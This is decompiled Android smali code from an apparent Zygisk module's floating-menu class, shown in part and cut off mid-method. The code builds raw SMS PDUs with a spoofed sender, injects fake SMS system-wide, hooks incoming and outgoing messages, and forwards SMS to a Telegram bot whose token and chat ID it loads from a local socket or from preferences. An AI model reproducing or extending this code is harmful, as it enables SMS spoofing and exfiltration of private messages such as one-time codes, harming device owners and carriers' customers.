.class public Lcom/floatingmenu/FloatingMenu;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field private static final TAG_MENU:Ljava/lang/String; = "zygisk_floating_menu"

.field private static sBodyText:Ljava/lang/String; = ""

.field private static sDemoFeature1:Z = false

.field private static sDemoFeature2:Z = false

.field public static sHookIncoming:Z = false

.field public static sHookOutgoing:Z = false

.field private static sSenderText:Ljava/lang/String; = "AD-TEST-S"


# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic access$000(Landroid/content/Context;F)I
    .registers 2

    invoke-static {p0, p1}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result p0

    return p0
.end method

.method public static synthetic access$100(Landroid/app/Activity;[Ljava/lang/String;)Landroid/widget/LinearLayout;
    .registers 2

    invoke-static {p0, p1}, Lcom/floatingmenu/FloatingMenu;->createProviderSelector(Landroid/app/Activity;[Ljava/lang/String;)Landroid/widget/LinearLayout;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic access$200(Landroid/content/Context;Ljava/lang/String;)V
    .registers 2

    invoke-static {p0, p1}, Lcom/floatingmenu/FloatingMenu;->showToast(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic access$300(Landroid/widget/LinearLayout;Ljava/lang/String;)V
    .registers 2

    invoke-static {p0, p1}, Lcom/floatingmenu/FloatingMenu;->updateSelector(Landroid/widget/LinearLayout;Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic access$400()Ljava/lang/String;
    .registers 1

    sget-object v0, Lcom/floatingmenu/FloatingMenu;->sSenderText:Ljava/lang/String;

    return-object v0
.end method

.method public static synthetic access$402(Ljava/lang/String;)Ljava/lang/String;
    .registers 1

    sput-object p0, Lcom/floatingmenu/FloatingMenu;->sSenderText:Ljava/lang/String;

    return-object p0
.end method

.method public static synthetic access$500()Ljava/lang/String;
    .registers 1

    sget-object v0, Lcom/floatingmenu/FloatingMenu;->sBodyText:Ljava/lang/String;

    return-object v0
.end method

.method public static synthetic access$502(Ljava/lang/String;)Ljava/lang/String;
    .registers 1

    sput-object p0, Lcom/floatingmenu/FloatingMenu;->sBodyText:Ljava/lang/String;

    return-object p0
.end method

.method public static synthetic access$600(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .registers 3

    invoke-static {p0, p1, p2}, Lcom/floatingmenu/FloatingMenu;->triggerLocalSmsBroadcast(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private static createProviderSelector(Landroid/app/Activity;[Ljava/lang/String;)Landroid/widget/LinearLayout;
    .registers 21

    move-object/from16 v0, p0

    new-instance v1, Landroid/widget/LinearLayout;

    invoke-direct {v1, v0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/widget/LinearLayout;->setOrientation(I)V

    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/high16 v4, 0x42000000    # 32.0f

    invoke-static {v0, v4}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result v4

    const/4 v5, -0x1

    invoke-direct {v3, v5, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/high16 v4, 0x40c00000    # 6.0f

    invoke-static {v0, v4}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result v6

    iput v6, v3, Landroid/widget/LinearLayout$LayoutParams;->topMargin:I

    invoke-virtual {v1, v3}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    const/4 v3, 0x4

    new-array v13, v3, [Ljava/lang/String;

    const-string v6, "jio"

    aput-object v6, v13, v2

    const/4 v6, 0x1

    const-string v7, "airtel"

    aput-object v7, v13, v6

    const/4 v14, 0x2

    const-string v7, "vi"

    aput-object v7, v13, v14

    const/4 v7, 0x3

    const-string v8, "bsnl"

    aput-object v8, v13, v7

    new-array v15, v3, [Ljava/lang/String;

    const-string v8, "Jio"

    aput-object v8, v15, v2

    const-string v8, "Airtel"

    aput-object v8, v15, v6

    const-string v6, "Vi"

    aput-object v6, v15, v14

    const-string v6, "BSNL"

    aput-object v6, v15, v7

    new-array v12, v3, [Landroid/widget/Button;

    new-instance v11, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v11}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const v6, -0xef467f

    invoke-virtual {v11, v6}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    invoke-static {v0, v4}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result v6

    int-to-float v6, v6

    invoke-virtual {v11, v6}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    new-instance v10, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v10}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const v6, -0xe0d6c9

    invoke-virtual {v10, v6}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    invoke-static {v0, v4}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result v4

    int-to-float v4, v4

    invoke-virtual {v10, v4}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    const/4 v4, 0x0

    :goto_73
    if-ge v4, v3, :cond_d5

    new-instance v9, Landroid/widget/Button;

    invoke-direct {v9, v0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    aget-object v6, v15, v4

    invoke-virtual {v9, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v6, 0x41300000    # 11.0f

    invoke-virtual {v9, v14, v6}, Landroid/widget/TextView;->setTextSize(IF)V

    invoke-virtual {v9, v5}, Landroid/widget/TextView;->setTextColor(I)V

    invoke-virtual {v9, v2, v2, v2, v2}, Landroid/view/View;->setPadding(IIII)V

    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;

    const/high16 v7, 0x3f800000    # 1.0f

    invoke-direct {v6, v2, v5, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    if-lez v4, :cond_9b

    const/high16 v7, 0x40800000    # 4.0f

    invoke-static {v0, v7}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result v7

    iput v7, v6, Landroid/widget/LinearLayout$LayoutParams;->leftMargin:I

    :cond_9b
    invoke-virtual {v9, v6}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    aget-object v6, v13, v4

    aget-object v7, p1, v2

    invoke-virtual {v6, v7}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_ac

    invoke-static {v9, v11}, Lcom/floatingmenu/a;->c(Landroid/widget/Button;Landroid/graphics/drawable/GradientDrawable;)V

    goto :goto_af

    :cond_ac
    invoke-static {v9, v10}, Lcom/floatingmenu/a;->c(Landroid/widget/Button;Landroid/graphics/drawable/GradientDrawable;)V

    :goto_af
    new-instance v8, Lcom/floatingmenu/FloatingMenu$7;

    move-object v6, v8

    move-object/from16 v7, p1

    move-object v2, v8

    move-object v8, v13

    move-object v3, v9

    move v9, v4

    move-object/from16 v16, v10

    move-object v10, v12

    move-object/from16 v17, v11

    move-object/from16 v18, v12

    move-object/from16 v12, v16

    invoke-direct/range {v6 .. v12}, Lcom/floatingmenu/FloatingMenu$7;-><init>([Ljava/lang/String;[Ljava/lang/String;I[Landroid/widget/Button;Landroid/graphics/drawable/GradientDrawable;Landroid/graphics/drawable/GradientDrawable;)V

    invoke-virtual {v3, v2}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    aput-object v3, v18, v4

    invoke-virtual {v1, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    add-int/lit8 v4, v4, 0x1

    move-object/from16 v10, v16

    move-object/from16 v12, v18

    const/4 v2, 0x0

    const/4 v3, 0x4

    goto :goto_73

    :cond_d5
    return-object v1
.end method

.method private static createSmsPdu(Ljava/lang/String;Ljava/lang/String;)[B
    .registers 11

    const-string v0, "+"

    const/4 v1, 0x0

    :try_start_3
    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-virtual {v2, v1}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/4 v3, 0x4

    invoke-virtual {v2, v3}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/4 v4, 0x0

    :goto_10
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v5

    const/16 v6, 0x30

    if-ge v4, v5, :cond_43

    invoke-virtual {p0, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v7, 0x2b

    if-eq v5, v7, :cond_40

    if-lt v5, v6, :cond_26

    const/16 v6, 0x39

    if-le v5, v6, :cond_40

    :cond_26
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    mul-int/lit8 v0, v0, 0x7

    add-int/lit8 v0, v0, 0x3

    div-int/2addr v0, v3

    invoke-virtual {v2, v0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v0, 0xd0

    invoke-virtual {v2, v0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-static {p0}, Lcom/floatingmenu/FloatingMenu;->pack7bit(Ljava/lang/String;)[B

    move-result-object p0

    array-length v0, p0

    invoke-virtual {v2, p0, v1, v0}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :goto_85

    :cond_40
    add-int/lit8 v4, v4, 0x1

    goto :goto_10

    :cond_43
    const-string v4, ""

    invoke-virtual {p0, v0, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v2, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-virtual {p0, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p0

    if-eqz p0, :cond_5c

    const/16 p0, 0x91

    invoke-virtual {v2, p0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_61

    :cond_5c
    const/16 p0, 0x81

    invoke-virtual {v2, p0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    :goto_61
    const/4 p0, 0x0

    :goto_62
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v0

    if-ge p0, v0, :cond_85

    invoke-virtual {v4, p0}, Ljava/lang/String;->charAt(I)C

    move-result v0

    sub-int/2addr v0, v6

    add-int/lit8 v5, p0, 0x1

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v7

    if-ge v5, v7, :cond_7b

    invoke-virtual {v4, v5}, Ljava/lang/String;->charAt(I)C

    move-result v5

    sub-int/2addr v5, v6

    goto :goto_7d

    :cond_7b
    const/16 v5, 0xf

    :goto_7d
    shl-int/2addr v5, v3

    or-int/2addr v0, v5

    invoke-virtual {v2, v0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    add-int/lit8 p0, p0, 0x2

    goto :goto_62

    :cond_85
    :goto_85
    invoke-virtual {v2, v1}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-virtual {v2, v1}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const-string p0, "UTC"

    invoke-static {p0}, Ljava/util/TimeZone;->getTimeZone(Ljava/lang/String;)Ljava/util/TimeZone;

    move-result-object p0

    invoke-static {p0}, Ljava/util/Calendar;->getInstance(Ljava/util/TimeZone;)Ljava/util/Calendar;

    move-result-object p0

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Ljava/util/Calendar;->get(I)I

    move-result v4

    rem-int/lit8 v4, v4, 0x64

    const/4 v5, 0x2

    invoke-virtual {p0, v5}, Ljava/util/Calendar;->get(I)I

    move-result v5

    add-int/2addr v5, v0

    const/4 v0, 0x5

    invoke-virtual {p0, v0}, Ljava/util/Calendar;->get(I)I

    move-result v0

    const/16 v6, 0xb

    invoke-virtual {p0, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    const/16 v7, 0xc

    invoke-virtual {p0, v7}, Ljava/util/Calendar;->get(I)I

    move-result v7

    const/16 v8, 0xd

    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I

    move-result p0

    rem-int/lit8 v8, v4, 0xa

    shl-int/2addr v8, v3

    div-int/lit8 v4, v4, 0xa

    or-int/2addr v4, v8

    invoke-virtual {v2, v4}, Ljava/io/ByteArrayOutputStream;->write(I)V

    rem-int/lit8 v4, v5, 0xa

    shl-int/2addr v4, v3

    div-int/lit8 v5, v5, 0xa

    or-int/2addr v4, v5

    invoke-virtual {v2, v4}, Ljava/io/ByteArrayOutputStream;->write(I)V

    rem-int/lit8 v4, v0, 0xa

    shl-int/2addr v4, v3

    div-int/lit8 v0, v0, 0xa

    or-int/2addr v0, v4

    invoke-virtual {v2, v0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    rem-int/lit8 v0, v6, 0xa

    shl-int/2addr v0, v3

    div-int/lit8 v6, v6, 0xa

    or-int/2addr v0, v6

    invoke-virtual {v2, v0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    rem-int/lit8 v0, v7, 0xa

    shl-int/2addr v0, v3

    div-int/lit8 v7, v7, 0xa

    or-int/2addr v0, v7

    invoke-virtual {v2, v0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    rem-int/lit8 v0, p0, 0xa

    shl-int/2addr v0, v3

    div-int/lit8 p0, p0, 0xa

    or-int/2addr p0, v0

    invoke-virtual {v2, p0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-virtual {v2, v1}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-static {p1}, Lcom/floatingmenu/FloatingMenu;->stringToGsm7BitSeptets(Ljava/lang/String;)[B

    move-result-object p0

    array-length p1, p0

    const/16 v0, 0xfa

    if-le p1, v0, :cond_101

    new-array p1, v0, [B

    invoke-static {p0, v1, p1, v1, v0}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    move-object p0, p1

    :cond_101
    array-length p1, p0

    invoke-virtual {v2, p1}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-static {p0}, Lcom/floatingmenu/FloatingMenu;->packSeptets([B)[B

    move-result-object p0

    array-length p1, p0

    invoke-virtual {v2, p0, v1, p1}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p0
    :try_end_111
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_111} :catch_112

    return-object p0

    :catch_112
    new-array p0, v1, [B

    return-object p0
.end method

.method private static dpToPx(Landroid/content/Context;F)I
    .registers 3

    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p0

    invoke-virtual {p0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object p0

    const/4 v0, 0x1

    invoke-static {v0, p1, p0}, Landroid/util/TypedValue;->applyDimension(IFLandroid/util/DisplayMetrics;)F

    move-result p0

    float-to-int p0, p0

    return p0
.end method

.method public static forwardSmsToTelegram(Ljava/lang/String;Ljava/lang/String;)V
    .registers 4

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/floatingmenu/FloatingMenu$6;

    invoke-direct {v1, p0, p1}, Lcom/floatingmenu/FloatingMenu$6;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private static getSystemContext()Landroid/content/Context;
    .registers 5

    const/4 v0, 0x0

    :try_start_1
    const-string v1, "android.app.ActivityThread"

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    const-string v2, "currentApplication"

    const/4 v3, 0x0

    new-array v4, v3, [Ljava/lang/Class;

    invoke-virtual {v1, v2, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/AccessibleObject;->setAccessible(Z)V

    new-array v2, v3, [Ljava/lang/Object;

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/Context;
    :try_end_1c
    .catchall {:try_start_1 .. :try_end_1c} :catchall_1d

    return-object v1

    :catchall_1d
    return-object v0
.end method

.method private static injectSmsSystemWideAsync(Ljava/lang/String;Ljava/lang/String;)V
    .registers 4

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/floatingmenu/FloatingMenu$4;

    invoke-direct {v1, p0, p1}, Lcom/floatingmenu/FloatingMenu$4;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static loadLicenseKey()Ljava/lang/String;
    .registers 5

    const-string v0, "UTF-8"

    const/4 v1, 0x0

    :try_start_3
    new-instance v2, Landroid/net/LocalSocket;

    invoke-direct {v2}, Landroid/net/LocalSocket;-><init>()V
    :try_end_8
    .catchall {:try_start_3 .. :try_end_8} :catchall_4c

    :try_start_8
    new-instance v1, Landroid/net/LocalSocketAddress;

    const-string v3, "zygisk_menu_socket"

    invoke-direct {v1, v3}, Landroid/net/LocalSocketAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Landroid/net/LocalSocket;->connect(Landroid/net/LocalSocketAddress;)V

    const/16 v1, 0xbb8

    invoke-virtual {v2, v1}, Landroid/net/LocalSocket;->setSoTimeout(I)V

    invoke-virtual {v2}, Landroid/net/LocalSocket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v1

    const-string v3, "GET_LICENSE\n"

    invoke-virtual {v3, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V

    new-instance v1, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-virtual {v2}, Landroid/net/LocalSocket;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-direct {v3, v4, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v1, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_46

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0
    :try_end_3f
    .catchall {:try_start_8 .. :try_end_3f} :catchall_43

    :try_start_3f
    invoke-virtual {v2}, Landroid/net/LocalSocket;->close()V
    :try_end_42
    .catchall {:try_start_3f .. :try_end_42} :catchall_42

    :catchall_42
    return-object v0

    :catchall_43
    move-exception v0

    move-object v1, v2

    goto :goto_4d

    :cond_46
    :try_start_46
    invoke-virtual {v2}, Landroid/net/LocalSocket;->close()V
    :try_end_49
    .catchall {:try_start_46 .. :try_end_49} :catchall_4a

    goto :goto_59

    :catchall_4a
    nop

    goto :goto_59

    :catchall_4c
    move-exception v0

    :goto_4d
    :try_start_4d
    const-string v2, "zygisk_floating_menu"

    const-string v3, "Error loading license key via socket, falling back to SharedPreferences"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_54
    .catchall {:try_start_4d .. :try_end_54} :catchall_70

    if-eqz v1, :cond_59

    :try_start_56
    invoke-virtual {v1}, Landroid/net/LocalSocket;->close()V
    :try_end_59
    .catchall {:try_start_56 .. :try_end_59} :catchall_4a

    :cond_59
    :goto_59
    invoke-static {}, Lcom/floatingmenu/FloatingMenu;->getSystemContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, ""

    if-eqz v0, :cond_6f

    const-string v2, "zygisk_menu_prefs"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "license_key"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0

    :cond_6f
    return-object v1

    :catchall_70
    move-exception v0

    if-eqz v1, :cond_76

    :try_start_73
    invoke-virtual {v1}, Landroid/net/LocalSocket;->close()V
    :try_end_76
    .catchall {:try_start_73 .. :try_end_76} :catchall_76

    :catchall_76
    :cond_76
    throw v0
.end method

.method public static loadSimSettingsEx()[Ljava/lang/String;
    .registers 6

    const-string v0, "UTF-8"

    const/4 v1, 0x6

    const/4 v2, 0x0

    :try_start_4
    new-instance v3, Landroid/net/LocalSocket;

    invoke-direct {v3}, Landroid/net/LocalSocket;-><init>()V
    :try_end_9
    .catchall {:try_start_4 .. :try_end_9} :catchall_59

    :try_start_9
    new-instance v2, Landroid/net/LocalSocketAddress;

    const-string v4, "zygisk_menu_socket"

    invoke-direct {v2, v4}, Landroid/net/LocalSocketAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Landroid/net/LocalSocket;->connect(Landroid/net/LocalSocketAddress;)V

    const/16 v2, 0xbb8

    invoke-virtual {v3, v2}, Landroid/net/LocalSocket;->setSoTimeout(I)V

    invoke-virtual {v3}, Landroid/net/LocalSocket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    const-string v4, "GET_SIM_SETTINGS\n"

    invoke-virtual {v4, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V

    new-instance v2, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/InputStreamReader;

    invoke-virtual {v3}, Landroid/net/LocalSocket;->getInputStream()Ljava/io/InputStream;

    move-result-object v5

    invoke-direct {v4, v5, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v2, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_55

    const-string v2, "|"

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_55

    const-string v2, "\\|"

    const/4 v4, -0x1

    invoke-virtual {v0, v2, v4}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v0

    array-length v2, v0
    :try_end_4c
    .catchall {:try_start_9 .. :try_end_4c} :catchall_52

    if-lt v2, v1, :cond_55

    :try_start_4e
    invoke-virtual {v3}, Landroid/net/LocalSocket;->close()V
    :try_end_51
    .catchall {:try_start_4e .. :try_end_51} :catchall_51

    :catchall_51
    return-object v0

    :catchall_52
    move-exception v0

    move-object v2, v3

    goto :goto_5a

    :cond_55
    :try_start_55
    invoke-virtual {v3}, Landroid/net/LocalSocket;->close()V
    :try_end_58
    .catchall {:try_start_55 .. :try_end_58} :catchall_66

    goto :goto_66

    :catchall_59
    move-exception v0

    :goto_5a
    :try_start_5a
    const-string v3, "zygisk_floating_menu"

    const-string v4, "Error loading SIM settings via socket"

    invoke-static {v3, v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_61
    .catchall {:try_start_5a .. :try_end_61} :catchall_86

    if-eqz v2, :cond_66

    :try_start_63
    invoke-virtual {v2}, Landroid/net/LocalSocket;->close()V
    :try_end_66
    .catchall {:try_start_63 .. :try_end_66} :catchall_66

    :catchall_66
    :cond_66
    :goto_66
    const/4 v0, 0x7

    new-array v0, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "false"

    aput-object v3, v0, v2

    const/4 v2, 0x1

    const-string v4, "jio"

    aput-object v4, v0, v2

    const/4 v2, 0x2

    const-string v5, ""

    aput-object v5, v0, v2

    const/4 v2, 0x3

    aput-object v3, v0, v2

    const/4 v2, 0x4

    aput-object v4, v0, v2

    const/4 v2, 0x5

    aput-object v5, v0, v2

    const-string v2, "in"

    aput-object v2, v0, v1

    return-object v0

    :catchall_86
    move-exception v0

    if-eqz v2, :cond_8c

    :try_start_89
    invoke-virtual {v2}, Landroid/net/LocalSocket;->close()V
    :try_end_8c
    .catchall {:try_start_89 .. :try_end_8c} :catchall_8c

    :catchall_8c
    :cond_8c
    throw v0
.end method

.method public static loadTelegramConfig()[Ljava/lang/String;
    .registers 8

    const-string v0, "UTF-8"

    const/4 v1, 0x1

    const/4 v2, 0x2

    const/4 v3, 0x0

    const/4 v4, 0x0

    :try_start_6
    new-instance v5, Landroid/net/LocalSocket;

    invoke-direct {v5}, Landroid/net/LocalSocket;-><init>()V
    :try_end_b
    .catchall {:try_start_6 .. :try_end_b} :catchall_67

    :try_start_b
    new-instance v4, Landroid/net/LocalSocketAddress;

    const-string v6, "zygisk_menu_socket"

    invoke-direct {v4, v6}, Landroid/net/LocalSocketAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Landroid/net/LocalSocket;->connect(Landroid/net/LocalSocketAddress;)V

    const/16 v4, 0xbb8

    invoke-virtual {v5, v4}, Landroid/net/LocalSocket;->setSoTimeout(I)V

    invoke-virtual {v5}, Landroid/net/LocalSocket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    const-string v6, "GET_CONFIG\n"

    invoke-virtual {v6, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/OutputStream;->flush()V

    new-instance v4, Ljava/io/BufferedReader;

    new-instance v6, Ljava/io/InputStreamReader;

    invoke-virtual {v5}, Landroid/net/LocalSocket;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-direct {v6, v7, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v4, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_61

    const-string v4, "|"

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_61

    const-string v4, "\\|"

    const/4 v6, -0x1

    invoke-virtual {v0, v4, v6}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v0

    array-length v4, v0

    if-lt v4, v2, :cond_61

    new-array v4, v2, [Ljava/lang/String;

    aget-object v6, v0, v3

    aput-object v6, v4, v3

    aget-object v0, v0, v1

    aput-object v0, v4, v1
    :try_end_5a
    .catchall {:try_start_b .. :try_end_5a} :catchall_5e

    :try_start_5a
    invoke-virtual {v5}, Landroid/net/LocalSocket;->close()V
    :try_end_5d
    .catchall {:try_start_5a .. :try_end_5d} :catchall_5d

    :catchall_5d
    return-object v4

    :catchall_5e
    move-exception v0

    move-object v4, v5

    goto :goto_68

    :cond_61
    :try_start_61
    invoke-virtual {v5}, Landroid/net/LocalSocket;->close()V
    :try_end_64
    .catchall {:try_start_61 .. :try_end_64} :catchall_65

    goto :goto_74

    :catchall_65
    nop

    goto :goto_74

    :catchall_67
    move-exception v0

    :goto_68
    :try_start_68
    const-string v5, "zygisk_floating_menu"

    const-string v6, "Error loading Telegram config via socket, falling back to SharedPreferences"

    invoke-static {v5, v6, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_6f
    .catchall {:try_start_68 .. :try_end_6f} :catchall_9c

    if-eqz v4, :cond_74

    :try_start_71
    invoke-virtual {v4}, Landroid/net/LocalSocket;->close()V
    :try_end_74
    .catchall {:try_start_71 .. :try_end_74} :catchall_65

    :cond_74
    :goto_74
    invoke-static {}, Lcom/floatingmenu/FloatingMenu;->getSystemContext()Landroid/content/Context;

    move-result-object v0

    const-string v4, ""

    if-eqz v0, :cond_95

    const-string v5, "zygisk_menu_prefs"

    invoke-virtual {v0, v5, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v5, "tg_token"

    invoke-interface {v0, v5, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "tg_chat_id"

    invoke-interface {v0, v6, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v2, [Ljava/lang/String;

    aput-object v5, v2, v3

    aput-object v0, v2, v1

    return-object v2

    :cond_95
    new-array v0, v2, [Ljava/lang/String;

    aput-object v4, v0, v3

    aput-object v4, v0, v1

    return-object v0

    :catchall_9c
    move-exception v0

